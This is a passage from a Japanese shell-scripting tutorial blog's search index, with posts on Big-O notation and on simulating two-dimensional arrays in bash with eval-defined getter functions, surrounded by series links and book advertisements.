再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-05T11:06:56+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/","title":"【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０"},{"content":"Bash/シェルスクリプトで学ぶビッグオー ビッグオーとは？\nオーダー記法です。\nオーダー記法とは、「計算量の割合」です。\n例）Aさんの年齢はｘ歳、１３０歳以上生きる人間は存在しない。\nｘ＜＝１３０となりますので、ビッグオー記法では、\nO(130) となります。\n例）\n相手に「0 以上 32 未満の整数値」をなにか 1 つ思い浮かべてもらい、それを当てたいです。\n相手に何回か「Yes / No で答えられる質問」をすることができます。できるだけ少ない回数で当てるにはどうしたらよいでしょうか？\n０ですか？\n１ですか？\n２ですか？\n３ですか？\n：\n：\nこの方法であれば最悪３２回の探索が必要となります。\nO(N)でこれは線形探索とアルゴリズムです。\nNは３２を表します。\n３２の半分の１６を基準に、\n１６以上ですか？\nはい なら: 0 以上 16 未満だとわかる\nいいえ なら: 16 以上 32 未満だとわかる\nはい　であれば、\n８以上ですか？\nと、半分に区切り質問していくと５会の質問で数を当てることができます。\nO(log(N)) となり、これは二分探索法（バイナリサーチ）となります。\nO(1) 配列の添字を使った探索がこれに該当する\n要素が多くなっても決まった処理しか行われない\n命令数がデータ数に比例することを意味する。\nデータ量と関係なく、処理時間が一定。\nオーダーで最も速い。\n#!/usr/bin/bash #配列 declare -a array=(1 2 3 4 5); # ## # 配列の添字アクセス # \u0026lt;\u0026gt;exec() function exec(){ local key=$1; echo \u0026#34;array[$key]: \u0026#34; $(( array[key] )); } ## # exec 3; O(N) 線形探索がこれに該当する。\n偶数出力はこのパターン。\n最悪ケースについて考えるパターン。\nデータ量に応じて処理時間が比例する\nfor文で配列の中身をくまなく調べる場合がこれ\n#!/usr/bin/bash declare -a array=(1,2,3,4,5); #配列 declare -i nElems=5; #要素の数 ## # \u0026lt;\u0026gt;exec() # forの一重ループ function exec(){ local key=$1; for((i=0;i\u0026lt;nElems;i++)){ if(( array[i]==key ));then echo \u0026#34;key : $key\u0026#34;; fi } } ## # # 実行 exec 3; O(N^2) バブルソートがこれに該当する\nかけ算の九九がこのパターン。\n二重ループに代表される縦と横、iとj、XとYといった総当り探索がこれ。\n二重ループ構造なので「指数的爆発」が起きて非常に遅くなる。\nデータが多いとクラッシュする可能性もあるので注意。\nO(N) に比べてかなり遅い。\n#!/usr/bin/bash declare -a array=(1 2 3 4 5); #配列 declare -i nElems=5; ## # \u0026lt;\u0026gt;exec() # forの二重ループ function exec(){ for((i=0;i\u0026lt;nElems;i++)){ for((j=0;j\u0026lt;nElems;j++)){ echo $(( array[i] + array[j] )); } } } exec ; O(N^3) 行列乗算の以下のパターン\nとてつもなく遅いです。\nfor((i=0;i\u0026lt;n;i++)){ for((j=0;j\u0026lt;n;j++)){ for((k=0;k\u0026lt;n;k++)){ array[k]=$(( array[i] * array[j] )); O(log(N)) 二分探索法（バイナリサーチ）がこれに該当する。\n処理するたびにターゲットが絞られて早くなるオーダー\nO(N) に比べてかなり早い\nデータ量に対して、計算量を常に半分にしていくのですごく速い。\nプログラムで書かれているのは「二分探索」というアルゴリズム。\nデータ量が 4000 あっても 12 回の処理で完了する\n#!/usr/bin/bash ######### # バイナリサーチによる # ユーザーへのインタフェース ######### # # 画面をクリアする clear # 要素の数は１００ declare -i nElems=100; echo \u0026#34;要素の数は $nElems です。\u0026#34; # for((i=0;i\u0026lt;nElems;i++)){ arr[$i]=$i; echo \u0026#34;${arr[$i]}\u0026#34;; } # echo -n \u0026#34;探したい数字を入力してください:\u0026#34; read item ## declare -i lb=1; declare -i ub=$nElems; while [ $lb -le $ub ];do x=`expr $ub + $lb` mid=`expr $x / 2` if [ $item -lt ${arr[$mid]} ];then ub=`expr $mid - 1` elif [ $item -gt ${arr[$mid]} ];then lb=`expr $mid + 1` elif [ $item -eq ${arr[$mid]} ];then echo $item found at position $mid break fi done if [ $lb -gt $ub ];then echo not found; fi O(N log(N)) クイックソート、マージソートがこれに該当する。\nビッグオーとアルゴリズム「ざっくり比較」 表記 意味 例 速い順 O(1) 定数 配列を添字アクセスする場合（ex. a[0] = 1;） 1 O(log(n)) 対数 二分探索 2 O(n) 一時 線形探索、グラフ探索 3 O(n log n) nlog n クイックソート、マージソート 4 O(N^2) 二次 バブルソート、挿入ソート 5 ビッグオー記法についてとても詳しく書かれている奇跡のページ\n計算量オーダーの求め方を総整理！ 〜 どこから log が出て来るか 〜\n配列の基本操作で学ぶ「追加」 例題１\n以下の配列の追加に必要な操作（回）数を求めると\n例題２−１ 次のように行われ、検索数５回、追加１回、合計は６回です。\n例題２−１ 例題２\n以下の配列の追加に必要な操作（回）数を求めると\n例題２−２ 次のように行われるため、検索数１回、追加で１回の合計２回となります。\n例題２−２ 例題３\n以下の配列の追加に必要な操作（回）数を求めると\n例題２−３ 次のように行われる。 検索数は１０回、追加で１回。\n例題２−３ 例題４\n以下の配列の４の後ろに３１を追加したい。\nこの追加（挿入）に必要な操作（回）数を求めると、\n例題２−４ 次のように行われる。\nまず、−４を検索します（場所を特定して記憶します）。\n次に配列の末尾に空いているセル（場所）があるか否かを調べます。\nあると、−４のセル以降のセルの後方への移動が可能となります（空きセルがないと、追加（挿入）は不可能となります）。\n−４を検索するために４回、その場所から、末尾に空いているセルがあるか否かを調べるために６回、これで検索数は１０回となります。\nその後、空白セルに一つずつセルを移動します。この作業は目印（−４の次のセル）まで行われます。この移動回数が５回となります。\nそうすると、セルに空きが生まれたので追加で１回。\n操作回数の合計は１６回となります。\n例題２−４ 配列の基本操作で学ぶ「削除」 例題５\n以下の配列の１１の要素を削除したい。この削除に必要な操作（回）数を求めると、\n例題２−５ 次のように行われる。\n該当のデータは最後の要素に格納されているため、配列の先頭から１０回の検索が必要です。データが見つかったため、削除自体は最後に１回行われます。つまり合計操作回数は１１回となります。\n最後のデータを削除すると、作業は検索と削除しか含めませんが、その他の一の削除になると、移動の作業も必要となります。\n例題２−５ 例題６\n以下の配列のセル８の内容を削除したい。この削除に必要な操作回数を求めると、\n例題２−６ 次のように行われる。\n該当のデータの削除後、空白のセルが生じます。配列にはこれは許されないため、その位置から以降の内容のあるセルの移動が必要となります。\nまず８を検索し、５回の検索で見つかりました。\nその後、８を削除し操作が１回。\n８の場所が空いたため、その位置以降の要素の内容を移動します。移動対象は５つなので、移動操作は５回行われます。\nつまり合計操作回数は１１回となります。\n例題２−６ 配列の基本操作で学ぶ「存在確認」 例題７\n以下の配列に７のデータがあるかを確認したい。\n例題２−７ 次のように行われる。\n配列がからっぽなので検索は１回。このため操作回数は１回となります。\n例題２−７ 例題８\n以下の配列に７のデータがあるかを確認したい。この検索に必要な操作（回）数を求めると、\n例題２−８ 次のように行われる。\n該当データがないことと、最後のセルしか空いていないため、配列を最後まで検索する必要があります。結果は検索が１０回となります。\n例題２−８ ヒント ビッグ・オーという計算量の割合を表す記法があるということを覚えておいてください。 バブルソートやバイナリサーチがどういった計算量なのかを考えるための基準は、配列へのアクセス方法、いわゆるループの構造です。 アルゴリズムの全てにビッグオーがあります。 この章で紹介した後半の「挿入」「削除」「移動」といった動きが計算量に影響するということを覚えておくと良いでしょう。 「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-04T13:47:09+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/","title":"【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９"},{"content":"はじめに さて。\n前回の章では、アルゴリズムを勉強していくためのもととなるテンプレートとして、配列に値を入れる仕組みと、配列の中身を表示する仕組みを実装した01Array.shを作成しました。\nとても淡白な配列実装\n01Array.sh\n今回の章では、前章で作成したテンプレートを２次元配列で実装を修正し、今後の高度なアルゴズムの実装に備えたいと思います。\nBashでは不可能とされてきた２次元配列を擬似的に振る舞う実装\n01Eval_Array.sh\nメインからの比較 ２次元配列自体がよくわからない人もいると思います。\nまず、配列の添字は０から数えます。（そういうものだと覚えるしかありません）\n２次元配列のarray配列の１番目の人で、０に名前、１に住所を格納します。\narray[0][0]=名前\narray[0][1]=住所\n２次元配列のarray配列の２番目の人で、０に名前、１に住所を格納します。\narray[1][0]=名前\narray[1][1]=住所\n２次元配列のarray配列の３番目の人で、０に名前、１に住所を格納します。\narray[2][0]=名前\narray[2][1]=住所\n:\n:\n＜以下同文＞\nこうした一つの配列の要素に、複数の値を格納できることを２次元配列といいます。\n当然、以下の様な３次元配列や\narray[0][0]=名前 array[0][1]=住所 array[0][2]=電話番号 以下のような４次元配列もあります。\narray[0][0]=名前 array[0][1]=住所 array[0][2]=電話番号 array[0][3]=メールアドレス C言語やJavaでは当たり前のように使われる多次元配列が、Bashではサポートされていません。\narray[0] は、可能なのですが、\narray[0][0] ができないのです。\n不便ですね。他の言語では、\narray[0].getName() と、すると名前を取り出せたり、\narray[0].getAddress() とすると、住所が取り出せたり、さらには\narray[0].setName() とすると、名前をセットしたりすることもできたりします。\nそんな直感的なコーディングがBashではできなかったりします。\n事実、アルゴリズムの勉強を進めていくと、ひとつの配列に、IDと値をそれぞれセットしたり、参照したり、置き換えたりしたくなるものです。\nこの章では、そうした「ふるまい」をBashで擬似的に実現してみようというチャレンジになります。\nシェバン、そしてメインへ 前章で作成した配列版は以下のとおりです。\n#!/usr/bin/bash ## # \u0026lt;\u0026gt;execArray() # function execArray(){ setArray $1; display; } ## # time execArray 10; exit; 今回の２次元配列版は以下のとおりです。\n#!/usr/bin/bash ## # \u0026lt;\u0026gt;execArray() # メインルーチン function execArray(){ local N=$1; #要素数 setArray $N #配列にセット display; #表示 } ## # 実行 # time execArray 10; exit; ほぼ同じですね。\n今回の２次元配列版では、前章の配列版よりもきちんと記述されています。（しています）\nlocalは、関数内のスコープ内でのみ有効な変数という定義です。 function execArray()に渡された $1パラメータは、関数冒頭で、Nという変数に代入されています。これにより、ソースの中で「$1」はなんだっけ？ということにならなくなります。\nポイント 関数内でのみ使う変数はlocalをつける 関数パラメータ $1,$2などといった変数は、関数冒頭できちんと命名規則に則った変数に代入して見渡しの良いソースを書くことを心がける 配列をセットする では、早速配列をセットしてみます。\n前章で作成した配列版は以下のとおりです。\n## # \u0026lt;\u0026gt; set Array # function setArray(){ nElems=0; for((i=0;i\u0026lt;$1;i++));do insert `echo \u0026#34;$RANDOM\u0026#34;`; done } 今回の２次元配列版は以下のとおりです。\n## # \u0026lt;\u0026gt; set Array # 配列を作成 function setArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ value=$( echo $RANDOM ); insert $((ID++)) $value; } } function setArray()もほぼ変化はありません。\n関数パラメータで受け取った $1 を local変数 Nに代入しています。さらに、関数内で使われる２つの変数「ID」と「value」を同じくlocal変数で定義しています。\n$RANDOMで取得したランダムな数字をinsert()関数に渡すわけですが、きちんと変数「value」に代入した上で、insert()関数に渡しています。\n$((ID++))は新しく出現した変数ですね。\n今回の章では、値だけでは一般的な配列で実装できてしまうので、あえて「ID」といった要素を追加しています。「ID」は１００からの連番として`insert()を呼び出すたびにインクリメントされます。\nlet \u0026#34;ID=ID+1\u0026#34;; という書き方よりも、他のプログラム言語でも使われる書式\n(( ID++ )); のほうが、慣れ親しんでいる人も多いかと思います。\n(( ID++ )); は、インクリメントするだけの場合の書き方となります。\nインクリメントした値を取り出して使う場合は、「$」をつけます。\n$(( ID++ )); ポイント 関数内でのみ使う変数はlocalをつける 関数パラメータ $1,$2などといった変数は、関数冒頭できちんと命名規則に則った変数に代入して見渡しの良いソースを書くことを心がける echo $RANDOMといったよく使われる動的変数は、valueといった値にきちんと格納して使う インクリメントは (( ID++ )); 値を取り出して使う場合は、 $(( ID++ )); 配列に値をセット ここでは、配列に値をセットしてみたいと思います。\nまずは、前章と、今回の章をみくらべてみましょう。\n前章で作成した配列版は以下のとおりです。\n## # \u0026lt;\u0026gt; insert # function insert(){ array[((nElems++))]=$1; } 今回の２次元配列版は以下のとおりです。\n## # \u0026lt;\u0026gt; insert # 配列の要素に値を代入 function insert(){ local ID=$1; #100からの連番 local value=$2; #配列に代入される要素の値 setID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((nElems++)); } function insert()に渡されたパラメータの処理はきちんと、localで定義し、$1,$2をソース内で乱用せずに、関数冒頭でわかりやすい変数に代入しています。\n((nElems++)); こちらは、値をインクリメントしているという事がわかります。\nインクリメントするだけで値を取り出す必要がないので $(( nElems++));とはなりません。\n新規で追加されているのは以下の２行ですね。\nsetID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット どうやら、function setID()とfunction setValue()といった関数が新たに追加されているようですね。\nそれぞれに、 $nElems と、$IDといった２つのパラメータを渡していることも見て取れます。\nでは次の項でfunction setID()とfunction setValue() といった「セッター」メソッドを見てみましょう。\n２つのセッターメソッド 「謎のevalコマンド」 セッターメソッドは、前章にはなかった新しい関数です。\n変数に値を入れるための関数で、IDに値を入れたい場合はfunction setID()、valueに値を入れたい場合はfunction setValue()を呼び出します。\n２つの関数冒頭のlocalと$1,$2を変数に置き換える話は、これまで何度化してきたので、もう説明は不要かと思います。\n## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; } evalが新しく登場するコマンドです。\nsetID()の中の以下の一行に注目してみます。\neval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; evalを使うことによっては文字列をコマンドとして扱うことができます。\n上記の例では、\n\u0026#34;aRray[$Elem].getID\u0026#34; という文字列に\necho \u0026#34;$ID\u0026#34;; をセットしています。\n\u0026#34;aRray[$Elem].getID\u0026#34; の、変数 $Elemは展開されますので、例えば\n\u0026ldquo;aRray[0].getID\u0026rdquo;\nと、なりますね。\u0026ldquo;aRray[0].getID\u0026quot;に\u0026quot;aRray[0].getID\u0026quot;に対応するIDを代入しておいて、必要なときに「aRray[0].getID」と書けば、値を取り出せます。valueに関しても同様のロジックです。\nポイント 関数内でのみ使う変数はlocalをつける 関数パラメータ $1,$2などといった変数は、関数冒頭できちんと命名規則に則った変数に代入して見渡しの良いソースを書くことを心がける echo $RANDOMといったよく使われる動的変数は、valueといった値にきちんと格納して使う インクリメントは (( ID++ )); 値を取り出して使う場合は、 $(( ID++ )); evalコマンドを使って２次元配列を擬似的に実装することは可能 残念なことが一つ。\n実はこれ、配列に見せているだけで、配列として動いてはいないのです。あくまで、getID/getValueという呼び出しによって、適宜取り出しやすくなるというメリットです。\nとはいえ、配列（っぽい）変数にsetID/setValueできたりgetID/getValueできたり、はてには、２次元、３次元で要素を格納できたりできることは悲願です。\ndisplay()出力関数の実装 ソースの冒頭に declare -i で数値を扱う変数として定義しています。bashでは変数定義は省略できますが、きちんと書いておくことにマイナス要素はありません。きちんと書きましょう。\n# # グローバル変数 declare -i nElems=0; ## # \u0026lt;\u0026gt;display() # 配列を表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo -n \u0026#34;aRray[$i] \\ ID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; echo \u0026#34;\u0026#34;; } } さて、function desplay()ですが、forの書き方がC/Java風ですね。\n中括弧｛｝で関数内容を囲むことができます。\n小括弧（）で条件式を囲むことができます。\n小括弧の２重化で(())、条件式の変数前の＄が不要となります。\n当然、do/doneは不要です。\necho -nは、行末の改行がないことを示します。よって次の行が続けて出力されます。\necho \u0026quot;\u0026quot;は、空行の挿入です。\nID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; ここは、文字列のなかで値をはめ込みたいから $(\u0026hellip;.)で囲んでいます。値だけを出力したい場合は、以下を実行すれば値だけが出力されます。\naRray[$i].getID; aRray[$i].getValue; ポイント 関数内でのみ使う変数はlocalをつける 関数パラメータ $1,$2などといった変数は、関数冒頭できちんと命名規則に則った変数に代入して見渡しの良いソースを書くことを心がける echo $RANDOMといったよく使われる動的変数は、valueといった値にきちんと格納して使う インクリメントは (( ID++ )); 値を取り出して使う場合は、 $(( ID++ )); evalコマンドを使って２次元配列を擬似的に実装することは可能 グローバルスコープでの変数定義は declare -i で数値、declare -a で配列 実行結果 実行結果は以下のとおりです。\nbash-5.1$ bash 01Eval_Array.sh aRray[0] ID: 100 Value: 31091 aRray[1] ID: 101 Value: 8361 aRray[2] ID: 102 Value: 21900 aRray[3] ID: 103 Value: 7788 aRray[4] ID: 104 Value: 26435 aRray[5] ID: 105 Value: 18735 aRray[6] ID: 106 Value: 19322 aRray[7] ID: 107 Value: 7051 aRray[8] ID: 108 Value: 2967 aRray[9] ID: 109 Value: 30591 real\t0m0.037s user\t0m0.016s sys\t0m0.020s bash-5.1$ ソース全文 この章のソース全文は以下のとおりです。\n####################################### # 01Array.shを、少しだけオブジェクティブに # aRray[0].getValue() で値を取得できるように改変した # 配列にIDと値を入れるだけのbashスクリプト ####################################### # # グローバル変数 declare -i nElems=0; ## # \u0026lt;\u0026gt;display() # 配列を表示 function display(){ for((i=0;i\u0026lt;nElems;i++)){ echo -n \u0026#34;aRray[$i] \\ ID: \u0026#34; $( aRray[$i].getID ) \u0026#34; \\ Value:\u0026#34; $( aRray[$i].getValue ) ; echo \u0026#34;\u0026#34;; } } ## # \u0026lt;\u0026gt;setValue() # セッター function setValue() { #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getValue() { echo \u0026#34;$value\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt;setID() # セッター function setID(){ #今後挿入や置き換えに備えてnElemsとは別の変数を用意しておく local Elem=\u0026#34;$1\u0026#34;; local ID=\u0026#34;$2\u0026#34;; eval \u0026#34;aRray[$Elem].getID() { echo \u0026#34;$ID\u0026#34;; }\u0026#34; } ## # \u0026lt;\u0026gt; insert # 配列の要素に値を代入 function insert(){ local ID=$1; #100からの連番 local value=$2; #配列に代入される要素の値 setID \u0026#34;$nElems\u0026#34; \u0026#34;$ID\u0026#34;; #IDをセット setValue \u0026#34;$nElems\u0026#34; \u0026#34;$value\u0026#34;; #Valueをセット ((nElems++)); } ## # \u0026lt;\u0026gt; set Array # 配列を作成 